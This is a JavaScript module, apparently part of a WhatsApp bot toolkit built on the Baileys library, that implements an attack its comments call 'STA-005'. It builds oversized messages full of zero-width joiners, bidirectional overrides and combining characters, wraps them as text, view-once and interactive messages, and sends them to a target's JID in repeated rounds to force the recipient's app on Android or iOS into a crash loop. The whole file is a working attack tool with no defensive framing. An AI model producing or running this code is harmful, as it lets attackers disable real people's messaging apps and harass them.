// ./SY/S7/sta005.js
// STA-005: Structured Text Amplification — oversized draft crash loop.
// Framework-level vector: Fragment SavedState → Binder transaction budget
// exceeded → TransactionTooLargeException → persistent crash loop.
// Works on Android 12-15 (Binder 1MB limit is architectural).
// iOS: CoreText layout pass blowup on oversized attributed strings.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- payload builders ----------

function buildAndroidDraft(seed = 0) {
    const ZWJ = '\u200D';
    const VS16 = '\uFE0F';
    const RTL = '\u202E';
    const LTR = '\u202D';

    const unit = (ZWJ + VS16 + RTL + LTR).repeat(4);
    const base = 'x'.repeat(40000);
    const amplified = (base + unit.repeat(seed + 1)).repeat(2);

    return amplified.slice(0, 120000);
}

function buildIosDraft(seed = 0) {
    const combining = '\u0301\u0302\u0303\u0304\u0305\u0306\u0307';
    const base = 'a'.repeat(30000);
    const amplified = (base + combining.repeat(seed + 1)).repeat(3);

    return amplified.slice(0, 100000);
}

// ---------- relay ----------
async function relay(client, targetJid, content) {
    const userJid =
        client?.user?.id ||
        client?.authState?.creds?.me?.id ||
        undefined;

    const waMsg = generateWAMessageFromContent(
        targetJid,
        content,
        { userJid }
    );

    await client.relayMessage(
        targetJid,
        waMsg.message,
        { messageId: waMsg.key.id }
    );

    return waMsg.key.id;
}

// ---------- payload 1: android draft bomb ----------
async function sendAndroidDraft(client, targetJid, seed = 0) {
    const text = buildAndroidDraft(seed);
    const content = {
        extendedTextMessage: {
            text,
            contextInfo: {
                mentionedJid: new Array(20).fill(targetJid),
                conversionSource: 'draft',
                quotedType: 0,
            },
        },
    };
    await relay(client, targetJid, content);
}

// ---------- payload 2: ios draft bomb ----------
async function sendIosDraft(client, targetJid, seed = 0) {
    const text = buildIosDraft(seed);
    const content = {
        extendedTextMessage: {
            text,
            contextInfo: {
                mentionedJid: new Array(20).fill(targetJid),
                conversionSource: 'ios',
            },
        },
    };
    await relay(client, targetJid, content);
}

// ---------- payload 3: view-once wrapper ----------
async function sendViewOnceDraft(client, targetJid, seed = 0) {
    const text = buildAndroidDraft(seed);
    const content = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text,
                    contextInfo: {
                        mentionedJid: [targetJid],
                        conversionSource: 'viewonce',
                    },
                },
            },
        },
    };
    await relay(client, targetJid, content);
}

// ---------- payload 4: interactive wrapper ----------
async function sendInteractiveDraft(client, targetJid, seed = 0) {
    const text = buildAndroidDraft(seed);
    const content = {
        interactiveMessage: {
            body: { text },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'quick_reply',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'OK',
                            id: 'dummy',
                        }),
                    },
                ],
            },
        },
    };
    await relay(client, targetJid, content);
}

// ---------- LID resolution ----------
async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return { jid: lid, mode: 'lid' };
        }
    } catch {}
    return { jid: targetJid, mode: 'pn' };
}

// ---------- orchestrator ----------
async function sta005(client, targetJid, options = {}) {
    if (!client) throw new Error('sta005: client required');
    if (!targetJid) throw new Error('sta005: targetJid required');

    const rounds = Number.isFinite(options.rounds) ? options.rounds : 4;
    const gapMs = Number.isFinite(options.gapMs) ? options.gapMs : 1200;
    const useLid = options.useLid !== false;

    const sendJid = useLid
        ? (await resolveBestJid(client, targetJid)).jid
        : targetJid;

    const stack = [
        sendAndroidDraft,
        sendViewOnceDraft,
        sendIosDraft,
        sendInteractiveDraft,
    ];

    for (let r = 0; r < rounds; r++) {
        for (const fn of stack) {
            try {
                await fn(client, sendJid, r);
            } catch {
                // swallow — next payload continues
            }
            await delay(gapMs);
        }
    }

    return { jid: sendJid, rounds, mode: useLid ? 'lid' : 'pn' };
}

module.exports = {
    sta005,
    sendAndroidDraft,
    sendIosDraft,
    sendViewOnceDraft,
    sendInteractiveDraft,
    resolveBestJid,
};
